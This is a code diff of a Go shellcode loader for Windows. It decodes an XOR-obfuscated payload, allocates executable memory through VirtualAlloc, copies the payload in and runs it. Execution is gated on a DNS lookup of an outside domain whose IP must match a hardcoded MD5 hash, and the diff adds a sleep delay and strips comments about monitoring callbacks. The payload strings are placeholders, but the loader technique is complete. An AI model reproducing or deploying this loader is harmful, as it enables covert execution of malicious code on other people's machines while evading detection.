@@ -7,16 +7,13 @@ import (
 	"net"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
 var (
-	kernel32 = syscall.NewLazyDLL("kernel32.dll")
-
-	// VirtualAlloc 申请虚拟内存
-	VirtualAlloc = kernel32.NewProc("VirtualAlloc")
-
-	// RtlMoveMemory 内存复制
+	kernel32      = syscall.NewLazyDLL("kernel32.dll")
+	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
 	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
 
 	xk = []byte{0x13, 0x54, 077, 0x1A, 0xA1, 0x3F, 0x04, 0x8B}
@@ -43,7 +40,6 @@ func Dencode(src string) []byte {
 
 func run(ppppppaaaaaaayyyyyyyyllllllooooooddddddd string) {
 	sch := Dencode(ppppppaaaaaaayyyyyyyyllllllooooooddddddd)
-	// fmt.Println(sch)
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sch)), 0x1000|0x2000, 0x40)
 	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sch[0])), uintptr(len(sch)))
 	syscall.Syscall(addr, 0, 0, 0, 0)
@@ -52,9 +48,8 @@ func run(ppppppaaaaaaayyyyyyyyllllllooooooddddddd string) {
 func main() {
 	domain := "sectest.dkkkkk.com"
 	ip, _ := net.ResolveIPAddr("ip", domain)
-	// 可通过监控 dns 查看是否被溯源反制、上线情况。
-
+	time.Sleep(time.Duration(2) * time.Second)
 	if calcMd5(ip.String()) == "e086aa137fa19f67d27b39d0eca18610" {
-		run("paylaod")
+		run("pauload")
 	}
 }
